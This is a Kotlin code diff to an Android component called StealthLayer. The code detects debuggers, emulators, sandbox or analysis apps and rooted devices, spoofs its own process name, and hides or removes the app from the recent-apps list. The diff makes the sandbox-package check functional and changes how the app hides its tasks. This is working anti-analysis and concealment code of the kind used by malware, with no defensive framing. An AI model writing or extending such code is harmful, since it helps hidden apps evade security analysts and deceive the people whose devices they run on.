@@ -19,14 +19,8 @@ object StealthLayer {
 
         val debug = isBeingDebugged()
         val emu = isEmulator()
-        val test = isRunningInTestEnvironment()
+        val test = isRunningInTestEnvironment(context)
         val root = isRooted()
-
-        if (debug || emu || test) {
-            spoofProcessName()
-            hideFromRecentApps(context)
-            return
-        }
 
         spoofProcessName()
         hideFromRecentApps(context)
@@ -76,9 +70,9 @@ object StealthLayer {
         return indicators.count { it } >= 3
     }
 
-    fun isRunningInTestEnvironment(): Boolean {
+    fun isRunningInTestEnvironment(context: Context): Boolean {
         return try {
-            val pm = android.content.Context::class.java.getDeclaredMethod("getPackageManager")
+            val pm = context.packageManager
             val packages = listOf(
                 "com.nohave.sandroid",
                 "com.bluestacks",
@@ -99,7 +93,12 @@ object StealthLayer {
                 "com.noshufou.android.su",
                 "com.koushikdutta.superuser",
             )
-            false
+            packages.any { pkg ->
+                try {
+                    pm.getPackageInfo(pkg, 0)
+                    true
+                } catch (_: Exception) { false }
+            }
         } catch (_: Exception) { false }
     }
 
@@ -135,7 +134,7 @@ object StealthLayer {
             val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
             val appTasks = am.appTasks
             for (task in appTasks) {
-                task.setExcludeFromRecents(true)
+                task.finishAndRemoveTask()
             }
         } catch (_: Exception) {}
     }
